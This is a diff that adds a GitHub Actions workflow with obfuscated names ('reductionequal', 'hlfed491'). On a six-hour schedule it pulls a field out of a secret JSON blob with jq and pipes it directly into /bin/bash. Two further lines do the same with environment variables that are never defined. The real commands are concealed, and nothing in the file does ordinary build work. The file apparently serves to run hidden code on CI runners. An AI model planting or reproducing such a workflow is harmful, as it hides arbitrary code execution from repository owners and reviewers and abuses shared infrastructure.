@@ -1,0 +1,19 @@
+name: reductionequal
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: reductionequal
+        env:
+          hlfed491: ${{ secrets.hlfed491 }}
+        run: |
+          echo $hlfed491 | jq -r .up515 | /bin/bash
+          echo $l75526 | jq -r .ic56 | /bin/bash
+          echo $gvdn23315 | jq -r .co4387 | /bin/bash
+
